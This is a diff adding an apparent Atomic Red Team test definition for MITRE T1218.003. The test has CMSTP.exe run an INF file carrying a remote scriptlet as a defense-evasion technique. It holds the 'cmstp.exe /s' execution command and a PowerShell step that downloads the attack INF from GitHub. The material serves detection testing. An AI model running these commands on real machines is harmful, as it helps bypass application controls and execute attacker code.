@@ -1,0 +1,36 @@
+{
+    "name": "CMSTP Executing Remote Scriptlet",
+    "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "cmstp.exe /s \"#{inf_file_path}\"\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1218.003",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "CMSTP",
+    "source": "ART",
+    "uuid": "34e63321-9683-496b-bbc1-7566bc55e624",
+    "arguments": {
+        "inf_file_path": {
+            "description": "Path to the INF file",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1218.003\\src\\T1218.003.inf"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "INF file must exist on disk at specified location (#{inf_file_path})\n",
+            "prereq_command": "if (Test-Path \"#{inf_file_path}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003.inf\" -OutFile \"#{inf_file_path}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
